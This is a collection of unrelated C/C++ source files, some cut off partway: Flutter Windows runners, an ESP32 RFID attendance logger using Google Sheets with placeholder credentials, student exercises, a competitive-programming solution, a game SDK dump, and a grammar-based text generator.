    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"asistant_bot\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"plugin/utils/TimeUtils.h\"\n\niMinecraft::TimeUtils::time_s iMinecraft::TimeUtils::getTimeNowStructure()\n{\n    iMinecraft::TimeUtils::time_s         time;\n    std::chrono::system_clock::time_point now = std::chrono::system_clock::now();\n\n    std::time_t now_time_t = std::chrono::system_clock::to_time_t(now);\n    std::tm*    now_tm     = new std::tm;\n    localtime_s(now_tm, &now_time_t);\n    time.years   = now_tm->tm_year + 1900;\n    time.months  = now_tm->tm_mon + 1;\n    time.days    = now_tm->tm_mday;\n    time.weeks   = now_tm->tm_wday + 1;\n    time.hours   = now_tm->tm_hour;\n    time.minutes = now_tm->tm_min;\n    time.seconds = now_tm->tm_sec;\n\n    time.yday  = now_tm->tm_yday;\n    time.isdst = now_tm->tm_isdst;\n\n    std::chrono::milliseconds ms;\n    std::chrono::microseconds cs;\n    std::chrono::nanoseconds  ns;\n\n    ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()) % 1000;\n    cs = std::chrono::duration_cast<std::chrono::microseconds>(now.time_since_epoch()) % 1000000;\n    ns = std::chrono::duration_cast<std::chrono::nanoseconds>(now.time_since_epoch()) % 1000000000;\n\n    time.milliseconds = ms.count();\n    time.microseconds = cs.count() % 1000;\n    time.nanoseconds  = ns.count() % 1000;\n\n    delete now_tm;\n    return time;\n}\n\nstd::string iMinecraft::TimeUtils::getTimeNow()\n{\n    time_s time = iMinecraft::TimeUtils::getTimeNowStructure();\n\n    return fmt::format(\n        \"{0}.{1}.{2}.{3}:{4}:{5}:{6}\",\n        time.years,\n        time.months,\n        time.days,\n        time.hours,\n        time.minutes,\n        time.seconds,\n        time.milliseconds\n    );\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fasum\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Projecto de registro de asistencia usando ESP32 + RFID MFRC522 + Google Spreadsheet\n// Toma como base el ejemplo de la librer\u00eda ESP Google Sheet Client\n// https://github.com/mobizt/ESP-Google-Sheet-Client/tree/master/examples/Values/Create_Update_Read\n\n#include <Arduino.h>\n#include <WiFi.h>\n#include <ESP_Google_Sheet_Client.h>\n#include \"time.h\"\n#include <SPI.h>\n#include <MFRC522.h>\n#include <Wire.h> \n#include <LiquidCrystal_I2C.h>\n\n// Auxiliar para montaje de la SD\n#include <GS_SDHelper.h>\n\n// Credenciales para la conexi\u00f3n WIFI\n#define WIFI_SSID \"SSID\"\n#define WIFI_PASSWORD \"PASSWORD\"\n\n// Credenciales para la conexi\u00f3n al servicio de Google\n#define PROJECT_ID \"NOMBRE_PROYECTO\"\n#define CLIENT_EMAIL \"CLIENTE DE CORREO COMPARTIDO\"\n#define USER_EMAIL \"CORREO DEL USUARIO\"\nconst char PRIVATE_KEY[] PROGMEM = \"-----BEGIN PRIVATE KEY----- clave privada -----END PRIVATE KEY-----\\n\";\nconst char SPREADSHEETID[] = \"PARTE DE LA URL QUE IDENTIFICA UNIVOCAMENTE A ESA PLANILLA DE C\u00c1LCULO\";\n\n// RFID - MFRC522\n\n// Conexi\u00f3n (para ESP32) usando SPI\n// SS/SDA -> D5\n// SCK    -> D18\n// MOSI   -> D23\n// MISO   -> D19\n// GND    -> GND\n// VCC    -> 3.3V\n// RST    -> D0\nconst int RST_PIN = 0;\nconst int SS_PIN = 5;\n\n// Instancia del lector RFID\nMFRC522 rfid(SS_PIN, RST_PIN); \n\nMFRC522::MIFARE_Key key; \n\n// Display LCD 16x2\n\n// Conexi\u00f3n para ESP32\n// SDA    -> D21\n// SCL    -> D22\n// GND    -> GND\n// VCC    -> 5v\nLiquidCrystal_I2C lcd(0x27, 16, 2);\n\n// LEDs de se\u00f1alizaci\u00f3n\nconst int LED_ROJO_ERROR = 25;\nconst int LED_VERDE_OK   = 26;\nconst int LED_AMARILLO_EN_PROCESO = 27;\nconst int LED_AZUL_POWER = 33;\n\n\n// Servidor de Fecha + Hora\nconst char* ntpServer = \"pool.ntp.org\";\n// Diferencia horaria en segundos para el timezone de R\u00edo Gallegos, Argentina\nconst long  gmtOffset_sec = -10800;\n\n// Funci\u00f3n auxiliar para el token de conexi\u00f3n con Google\nvoid tokenStatusCallback(TokenInfo info);\n\n// Funci\u00f3n auxiliar para mostrar mensajes en el LCD\nvoid mostrar_mensajes(String linea1, String linea2){\n  lcd.clear();\n  lcd.setCursor(0, 0);\n  lcd.print(linea1);\n  lcd.setCursor(0, 1);\n  lcd.print(linea2);\n\n}\n\n// Array auxiliar para ilustrar el avance de la conexi\u00f3n al WiFi\nchar espera[] = { '-', '\\\\', '|', '/' };\n\n\nvoid setup()\n{\n\n    Serial.begin(115200);\n    Serial.println();\n    Serial.println();\n\n    // LEDs indicadores\n    pinMode(LED_ROJO_ERROR, OUTPUT);\n    pinMode(LED_VERDE_OK, OUTPUT);\n    pinMode(LED_AMARILLO_EN_PROCESO, OUTPUT);\n    pinMode(LED_AZUL_POWER, OUTPUT);\n\n    // LED ROJO encendido\n    digitalWrite(LED_ROJO_ERROR, HIGH);\n    digitalWrite(LED_AZUL_POWER, LOW);\n    digitalWrite(LED_AMARILLO_EN_PROCESO, LOW);\n    digitalWrite(LED_VERDE_OK, LOW);\n\n    // RFID\n    SPI.begin();\n    rfid.PCD_Init();\n\n    // LCD\n    lcd.init(); \n    lcd.backlight();\n    lcd.setCursor(1, 0);\n    lcd.print(\"Control Asistencia\");\n\n\n    // Configuraci\u00f3n de la zona horaria para el servidor NTP\n    configTime(gmtOffset_sec, 0, ntpServer);\n\n    GSheet.printf(\"ESP Google Sheet Client v%s\\n\\n\", ESP_GOOGLE_SHEET_CLIENT_VERSION);\n    \n\n    #if defined(ESP32) || defined(ESP8266)\n        WiFi.setAutoReconnect(true);\n    #endif\n\n    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);\n\n    unsigned long ms = millis();\n    int avance = 0;\n    while (WiFi.status() != WL_CONNECTED)\n    {\n      avance ++;\n      mostrar_mensajes(\"Conectando WiFi...\", String(espera[avance % 4]));\n      delay(300);\n    }\n\n    // Una vez conectado, apago LED_ROJO y enciendo LED_AZUL\n    digitalWrite(LED_ROJO_ERROR, LOW);\n    digitalWrite(LED_AZUL_POWER, HIGH);\n\n    mostrar_mensajes(\"Connectado IP: \", String(WiFi.localIP()));\n\n    // Seteo de par\u00e1metros de la librer\u00eda Google Sheet \n    // Establecer callBack para el estado de generaci\u00f3n del token de acceso a la API de Google (s\u00f3lo para depuraci\u00f3n)\n    GSheet.setTokenCallback(tokenStatusCallback);\n    // Establezca los segundos para actualizar el token de autenticaci\u00f3n antes de que caduque (de 60 a 3540, por defecto 300 segundos).\n    GSheet.setPrerefreshSeconds(10 * 60);\n    // Iniciar la generaci\u00f3n del token de acceso para la autenticaci\u00f3n de Google API\n    GSheet.begin(CLIENT_EMAIL, PROJECT_ID, PRIVATE_KEY);\n\n\n}\n\nvoid loop()\n{\n\n  // Detecto si hay una nueva tarjeta presente\n  if (rfid.PICC_IsNewCardPresent()){\n    // Si la puedo leer\n    if (rfid.PICC_ReadCardSerial()){\n\n        MFRC522::StatusCode status;\n        byte blockAddr = 4;\n        String strNombre;\n\n        // Enciendo LED_AMARILLO para indicar que esta en proceso\n        digitalWrite(LED_AMARILLO_EN_PROCESO, HIGH);\n\n        // Llamar a ready() repetidamente en bucle para comprobar y procesar la autenticaci\u00f3n\n        bool ready = GSheet.ready();\n\n        if (ready)\n        {\n\n            FirebaseJson response;\n            FirebaseJson valueRange;\n\n            // Leer el ID\n            String strUID = String(rfid.uid.uidByte[0], HEX) + \" \" + String(rfid.uid.uidByte[1], HEX) + \" \" + String(rfid.uid.uidByte[2], HEX) + \" \" + String(rfid.uid.uidByte[3], HEX);\n            // Obtener d\u00eda y hora\n         ",
    "#include <bits/stdc++.h>\r\n#define ff first\r\n#define ss second\r\nusing namespace std;\r\n\r\ntypedef long long ll;\r\ntypedef pair<int, int> pii;\r\n\r\nconst int SZ = 110;\r\nconst int dx[4] = {1, 0, -1, 0};\r\nconst int dy[4] = {0, 1, 0, -1};\r\n\r\nint n, m, a[SZ][SZ], b[SZ][SZ], vis[SZ][SZ];\r\nint main() {\r\n\tcin.tie(0); ios_base::sync_with_stdio(0);\r\n\r\n\tcin >> n >> m;\r\n\tfor (int i = 0; i < n; i++) {\r\n\t\tfor (int j = 0; j < m; j++) {\r\n\t\t\tcin >> a[i][j];\r\n\t\t}\r\n\t}\r\n\r\n\tint px, py;\r\n\tfor (int i = 0; i < n; i++) {\r\n\t\tfor (int j = 0; j < m; j++) {\r\n\t\t\tcin >> b[i][j];\r\n\t\t\tif (b[i][j] == 1) {\r\n\t\t\t\tpx = i;\r\n\t\t\t\tpy = j;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tint s = 0, e = 1e9;\r\n\twhile (s < e) {\r\n\t\tint d = (s + e) / 2;\r\n\r\n\t\tqueue<pii> Q;\r\n\t\tQ.push({px, py});\r\n\t\tvis[px][py] = true;\r\n\r\n\t\twhile (!Q.empty()) {\r\n\t\t\tauto [x, y] = Q.front();\r\n\t\t\tQ.pop();\r\n\r\n\t\t\tfor (int t = 0; t < 4; t++) {\r\n\t\t\t\tint nx = x + dx[t];\r\n\t\t\t\tint ny = y + dy[t];\r\n\r\n\t\t\t\tif (0 <= nx && nx < n && 0 <= ny && ny < m && abs(a[x][y] - a[nx][ny]) <= d && !vis[nx][ny]) {\r\n\t\t\t\t\tvis[nx][ny] = true;\r\n\t\t\t\t\tQ.push({nx, ny});\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tbool flag = true;\r\n\t\tfor (int i = 0; i < n; i++) {\r\n\t\t\tfor (int j = 0; j < m; j++) {\r\n\t\t\t\tif (b[i][j] && !vis[i][j]) {\r\n\t\t\t\t\tflag = false;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tfor (int i = 0; i < n; i++) {\r\n\t\t\tfor (int j = 0; j < m; j++) {\r\n\t\t\t\tvis[i][j] = false;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (flag) e = d;\r\n\t\telse s = d + 1;\r\n\t}\r\n\tcout << s << '\\n';\r\n\r\n}\r\n",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct Node\n{\n    int noMhs;\n    string name;\n    Node* next;\n    Node* prev;\n};\n\nNode* START = NULL;\n\nvoid addNode() {\n    Node* newNode = new Node(); // STEP 1: create a new node\n    cout << \"\\nEnter the roll number of student: \";\n    cin >> newNode->noMhs;      // assign value to the data field of the new node\n    cout << \"\\nEnter the name of the student: \";\n    cin >> newNode->name;       // Assign value to the data field of the new node\n\n    // Insert the new node in the list\n    if (START == NULL || newNode->noMhs <= START->noMhs) { // STEP 2: insert the new node\n        \n        if (START != NULL && newNode->noMhs == START->noMhs) {\n            cout << \"\\033[31mDuplicate roll not allowed\\033[0m\" << endl;\n            return;\n        }\n        // If the list is empty, make the new node the START\n        newNode->next = START;  //STEP 3: make the new node point to the first node\n        if (START != NULL) {    \n            START->prev = newNode;  //STEP 4: make the first node point to the new node\n        }\n        newNode->prev = NULL;       //STEP 5: make the new node point to NULL\n        START = newNode;            //STEP 6: make the new node the first node\n    }\n    else {\n        // insert the new node in the middle or at the end\n        Node* current = START; // STEP 1.a: start from the first\n        Node* previous = NULL; // STEP 1.b: previous node is NULL initially\n\n        while (current != NULL && current->noMhs < newNode->noMhs) { // STEP 1.c: traver\n            previous = current; // STEP 1.d: move the previous to the current Node\n            current = current->next; // STEP 1.e: move the current to the next node\n        }\n\n        newNode->next = current; // STEP 4: Make the next field of the new node point to current\n        newNode->prev = previous; // STEP 5: Make the previous field of the new node point to previous\n        \n        if (current != NULL) {\n            current->prev = newNode; // STEP 6: Make the previous field of the current\n        }\n\n        if (previous != NULL) {\n            previous->next = newNode; // STEP 7 : make the next field of the previous node\n        }\n        else {\n            //If previous is still NULL, it means newNode is now the first node\n            START = newNode;\n        }\n    }\n}\n\nbool search(int rollNo, Node** previous, Node** current)\n{\n    *previous = NULL;\n    *current = START;\n    while (*current != NULL && (*current)->noMhs != rollNo)\n    {\n        *previous = *current;\n        *current = (*current)->next;\n    }\n    return (*current != NULL);\n}\n\nvoid deleteNode()\n{\n    Node* previous, * current;\n    int rollNo;\n\n    cout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n    cin >> rollNo;                                                                  //STEP 3: get the roll number to be deleted\n\n    if (START == NULL)\n    {\n        cout << \"List is empety\" << endl;\n        return;\n    }\n\n    current = START;                                                               //STEP 1: start from the first node\n    previous = NULL;\n\n    //locate the node to be deleted\n    while (current != NULL && current->noMhs != rollNo)\n    {\n        previous = current;\n        current = current->next;\n    }\n\n    if (current == NULL)\n    {\n        cout << \"\\033[31mThe record with roll number \" << rollNo << \"not found\\033[0m\" << endl;\n        return;\n    }\n\n    //Node to be deleted is the firts node\n    if (current == START)\n    {\n        START = START->next;                                            //STEP 2: update the START pointer\n        if (START != NULL)\n        {\n            START->prev = NULL;                                         //step\n        }\n    }\n    else\n    {   //Node to be deleted is not the first node\n        previous->next = current->next;\n        if (current->next != NULL)\n        {   //if there's successor, update is prev pointer\n            current->next->prev = previous;\n        }\n    }\n\n    //release the memory of the node marked as current\n    delete current;\n    cout << \"\\x1b[32mRecord with roll number \" << rollNo << \"deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n    return (START == NULL);\n}\n\nvoid traverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is ascending order of roll number are:  \" << endl;\n        Node* currentNode = START;              //STEP 1\n        while (currentNode != NULL)             //STEP 2\n        {\n            cout << currentNode->noMhs << \" \" << currentNode->name << endl;         //STEP 3\n            currentNode = currentNode->next;                                        //STEP 4\n        }\n    }\n}\n\nvoid revtraverse()\n{\n    if (listEmpty())\n        cout << \"\\nList is empty\" << endl;\n    else\n    {\n        cout << \"\\nRecord is descending order of roll number are:  \" << endl;\n        Node* currentNode = START;\n        while (currentNode->next != NULL)\n      ",
    "#pragma once\n\n// Dumped with Dumper-7!\n\n\n#include \"../SDK.hpp\"\n\nnamespace SDK\n{\n//---------------------------------------------------------------------------------------------------------------------\n// FUNCTIONS\n//---------------------------------------------------------------------------------------------------------------------\n\n\n// BlueprintGeneratedClass B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C\n// (Actor)\n\nclass UClass* AB_FireExtinguisherWeapon_C::StaticClass()\n{\n\tstatic class UClass* Clss = nullptr;\n\n\tif (!Clss)\n\t\tClss = UObject::FindClassFast(\"B_FireExtinguisherWeapon_C\");\n\n\treturn Clss;\n}\n\n\n// B_FireExtinguisherWeapon_C B_FireExtinguisherWeapon.Default__B_FireExtinguisherWeapon_C\n// (Public, ClassDefaultObject, ArchetypeObject, WasLoaded, LoadCompleted)\n\nclass AB_FireExtinguisherWeapon_C* AB_FireExtinguisherWeapon_C::GetDefaultObj()\n{\n\tstatic class AB_FireExtinguisherWeapon_C* Default = nullptr;\n\n\tif (!Default)\n\t\tDefault = static_cast<AB_FireExtinguisherWeapon_C*>(AB_FireExtinguisherWeapon_C::StaticClass()->DefaultObject);\n\n\treturn Default;\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.OnRep_AttachedBGAActor\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::OnRep_AttachedBGAActor()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"OnRep_AttachedBGAActor\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.ReceiveBeginPlay\n// (Event, Protected, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::ReceiveBeginPlay()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"ReceiveBeginPlay\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.BGADestroyedWhileHeld\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::BGADestroyedWhileHeld()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"BGADestroyedWhileHeld\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.BindHolsterEvents\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::BindHolsterEvents()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"BindHolsterEvents\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.UnbindHolsterEvents\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::UnbindHolsterEvents()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"UnbindHolsterEvents\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.K2_OnUnEquip\n// (Event, Public, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::K2_OnUnEquip()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"K2_OnUnEquip\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.OnHolstered\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::OnHolstered()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"OnHolstered\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.ReplicateOnHolstered\n// (Net, NetReliable, NetServer, BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::ReplicateOnHolstered()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"ReplicateOnHolstered\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.UpdateAndAttachBGA\n// (BlueprintCallable, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::UpdateAndAttachBGA()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"UpdateAndAttachBGA\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.OnWeaponAttached\n// (Event, Public, BlueprintEvent)\n// Parameters:\n\nvoid AB_FireExtinguisherWeapon_C::OnWeaponAttached()\n{\n\tstatic class UFunction* Func = nullptr;\n\n\tif (!Func)\n\t\tFunc = Class->GetFunction(\"B_FireExtinguisherWeapon_C\", \"OnWeaponAttached\");\n\n\n\n\tUObject::ProcessEvent(Func, nullptr);\n\n}\n\n\n// Function B_FireExtinguisherWeapon.B_FireExtinguisherWeapon_C.ReplicateOnUnholstered\n// (Net, NetReliable, NetServer, BlueprintCallable, BlueprintEvent",
    "#include <iostream>\n\n\nusing namespace std;\n\n// costanti che definiscono il numero massimo di righe e colonne\nconst int righeMax=30;\nconst int colonneMax=30;\n\n//prototipi\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne);\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne);\nint Menu();\n\nint main() {\n\n  int scelta;\n  int righe, colonne;\n  int matrix[righeMax][colonneMax];\n  do {\n    scelta=Menu();\n    switch(scelta) {\n      case 1:\n        caricaMatrice(matrix,righe,colonne);\n      break;\n      case 2:\n        visualizzaMatrice(matrix,righe,colonne);\n      break;\n      case 0:\n        cout<<\"Esci\"<<endl;\n      break;\n      default:\n        cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n      break;\n    }\n  }while(scelta!=0);\n  \n}\n\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Carica matrice\"<<endl;\n  cout<<\"2-Visualizza matrice\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\n\nvoid caricaMatrice(int matrix[righeMax][colonneMax], int &righe, int &colonne) {\n\n  cout<<endl;\n\n  do{\n    cout<<\"Inserisci il numero di righe: \";\n    cin>>righe;\n    if(righe<=0||righe>righeMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(righe<=0||righe>righeMax);\n\n  do{\n    cout<<\"Inserisci il numero di colonne: \";\n    cin>>colonne;\n    if(colonne<=0||colonne>colonneMax) {\n      cout<<\"Errore\"<<endl;\n    }\n  }while(colonne<=0||colonne>colonneMax);\n\n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<\"Inserisci il valore della cella \"<<i+1<<\" \"<<j+1<<\": \";\n      cin>>matrix[i][j];\n    }\n  }\n\n\n  cout<<endl;\n  \n}\n\nvoid visualizzaMatrice(int matrix[righeMax][colonneMax], int righe, int colonne) {\n\n  cout<<endl;\n  \n  for(int i=0; i<righe; i++) {\n    for(int j=0; j<colonne; j++) {\n      cout<<matrix[i][j]<<\"\\t\";\n    }\n    cout<<endl;\n  }\n\n  cout<<endl;\n  \n}\n",
    "#include <iostream>\n#include <fstream>\n#include <map>\n#include <string>\n#include <vector>\n#include <memory>\n#include <format>\n#include <queue>\n#include <cstdlib>\n#include \"json.hpp\"\n\nusing namespace std;\nusing json = nlohmann::json;\n\nenum Type\n{\n    non_terminal,\n    terminal,\n    expression\n};\n\nstruct Node\n{\n    string name;\n    Type tp;\n    vector<Node *> subnode;\n};\n\nclass Grammar\n{\npublic:\n    Grammar(json &content, unsigned maxdepth)\n    {\n        map<string, vector<vector<string>>> contentInstd = content.template get<map<string, vector<vector<string>>>>();\n        for (auto key : contentInstd)\n        {\n            allocate_node(key.first, Type::non_terminal);\n        }\n        for (auto rule : contentInstd)\n        {\n            for (auto expression : rule.second)\n            {\n                // check subnode is an expression or sigel node to compress the grammar;\n                if (expression.size() == 1)\n                {\n                    Node *newnode;\n                    if (this->mp.count(expression[0]) == 0)\n                    {\n                        newnode = this->allocate_node(expression[0], Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[expression[0]];\n                    }\n                    mp[rule.first]->subnode.push_back(newnode);\n                    continue;\n                }\n                Node *optnodes = allocate_node(\"\", Type::expression);\n                for (auto option : expression)\n                {\n                    Node *newnode;\n                    if (this->mp.count(option) == 0)\n                    {\n                        newnode = this->allocate_node(option, Type::terminal);\n                    }\n                    else\n                    {\n                        newnode = mp[option];\n                    }\n                    optnodes->subnode.push_back(newnode);\n                }\n                mp[rule.first]->subnode.push_back(optnodes);\n            }\n        }\n        this->start = mp[\"<start>\"];\n        this->maxdepth = maxdepth;\n        this->getshortcut();\n    }\n\n    void JIT(string file, bool show)\n    {\n        string code = R\"(#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include <string.h>\n\n#define BUFFER_SIZE 512*1024*1024   // buffer for storing text\n)\";\n        code += \"#define MAX_DEPTH \" + to_string(this->maxdepth) + \"\\n\";\n        code += R\"(\n//xor to get random number\n#define xor(l) \\\n    seed ^= seed << 13; \\\n    seed ^= seed >> 17; \\\n    seed ^= seed << 5; \\\n    branch = seed % l\n\n#define NEXT() goto *program[pc++] // fetch next instruction\n\n#define initStack() do { \\\n    stack.top = -1; \\\n    stack.capacity = MAX_DEPTH; \\\n} while (0)\n\n#define pop() (stack.top--) \n\ntypedef struct {\n    char data[BUFFER_SIZE];\n    unsigned top;\n} Buffer;\n\nBuffer buffer;  // Declare a global buffer\n\n#define extend(c) { \\\n    if (buffer.top < BUFFER_SIZE) { \\\n        buffer.data[buffer.top++] = c; \\\n    } \\\n}\n\n#define printbuff() { \\\n    for (unsigned i = 0; i < buffer.top; i++) { \\\n        putchar(buffer.data[i]); \\\n    } \\\n    putchar('\\n'); \\\n}\n\n#define clean() { \\\n    buffer.top = 0; \\\n}\n\n//frame used to record current context\ntypedef struct {\n    void* Program[64]; //allow 64 options for each rule, adding hitting rate in chache.  \n    unsigned int PC;    // program counter \n} frame;\n\n// the stack from frame\ntypedef struct {\n    frame frames[MAX_DEPTH];     //the first pointer of frame\n    int top;              // the top of stack\n    int capacity;         // the capacity of stack\n} Stack;\n\nunsigned seed;  // Random seed\nunsigned branch;  // To hold branch value\nStack stack;\nunsigned pc; //program counter;\nvoid* program[1000];\n\n\nint main() {\n    srand(time(NULL));\n    seed = rand();  // Initialize the seed\n    initStack();\n)\";\n        code += \"    unsigned sum = 0;\\n\";\n        code += \"    clock_t start = clock();\\n\";\n        code += \"    unsigned int iterator = 0;\\n\";\n        code += \"    memcpy(program, (void*[]){\";\n        code += \"&&func_\" + to_string(reinterpret_cast<uintptr_t>(this->start)) + \",&&HALT}, sizeof(void*[2]));\\n\";\n        code += \"START:\\n\";\n        code += R\"(    NEXT();\n    RET:\n        pc = stack.frames[stack.top].PC;\n        memcpy(program, stack.frames[stack.top].Program, sizeof(void*[64]));\n        pop();\n        NEXT();\n    HALT:\n        stack.top = -1;\n        pc = 0;\n        goto end;\n)\";\n        string blocks = \"\";\n        for(auto &x:this->nodes){\n            string block = \"\";\n            block += \"    func_\"+to_string(reinterpret_cast<uintptr_t>(x))+\":\\n\";\n            if(x -> tp == Type::terminal){\n                for (int j = 0; j < x->name.size(); j++)\n                {\n                    block += \"        extend(\" + to_string((unsigned)x->name[j]) + \");\\n\";\n                }\n                block += \"        NEXT();\\n\";\n            } else if(x -> tp == Type::non_terminal){\n                block += \"        if(stack.top==MAX_DEPTH",
